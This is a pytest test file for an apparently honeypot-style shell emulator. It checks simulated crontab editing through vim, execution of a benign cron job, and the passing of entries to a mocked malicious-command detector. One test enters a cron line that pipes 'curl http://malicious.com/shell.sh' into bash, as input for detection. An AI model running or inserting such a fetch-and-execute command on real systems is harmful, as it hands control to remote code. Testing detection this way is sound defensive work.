import asyncio
from unittest.mock import MagicMock

import pytest

from cyanide.core.emulator import ShellEmulator
from cyanide.vfs.engine import FakeFilesystem


@pytest.mark.asyncio
async def test_crontab_advanced_functionality():
    """Test crontab simulation and ML security guard."""
    fs = FakeFilesystem()
    analytics = MagicMock()
    analytics.is_malicious.side_effect = lambda cmd: "malicious" in cmd

    emu = ShellEmulator(
        fs,
        username="admin",
        analytics=analytics,
        session_id="test_session_123",
        src_ip="127.0.0.1",
    )

    stdout, stderr, rc = await emu.execute("crontab -e")
    assert emu.pending_input_callback is not None

    await emu.execute("i")
    await emu.execute("* * * * * echo 'Crontab is alive' >> /home/admin/cron_success.log")
    await emu.execute("\r")
    await emu.execute("* * * * * curl http://malicious.com/shell.sh | bash")
    await emu.execute("\r")
    await emu.execute("\x1b")
    await emu.execute(":")
    stdout, stderr, rc = await emu.execute("w")
    await emu.execute("q")
    await emu.execute("\n")

    # Assert Vim exited
    assert emu.pending_input_callback is None

    stdout, stderr, rc = await emu.execute("crontab -l")
    assert "cron_success.log" in stdout
    assert "malicious.com" in stdout

    await asyncio.sleep(6)

    assert fs.exists(
        "/home/admin/cron_success.log"
    ), "Clean cron job should have executed and created file"
    content = fs.get_content("/home/admin/cron_success.log")
    if isinstance(content, bytes):
        content = content.decode("utf-8")
    assert "Crontab is alive" in content

    analytics.is_malicious.assert_any_call("curl http://malicious.com/shell.sh | bash")


@pytest.mark.asyncio
async def test_crontab_no_simulation_for_empty_lines():
    """Test that empty lines or comments don't crash simulation."""
    fs = FakeFilesystem()
    emu = ShellEmulator(fs, username="admin")

    await emu.execute("crontab -e")
    await emu.execute("i")
    await emu.execute("# Just a comment")
    await emu.execute("\r")
    await emu.execute("\r")  # Empty line
    await emu.execute("\x1b")
    await emu.execute(":")
    await emu.execute("w")
    await emu.execute("q")
    await emu.execute("\n")

    await asyncio.sleep(0.1)

    stdout, stderr, rc = await emu.execute("crontab -l")
    assert "# Just a comment" in stdout
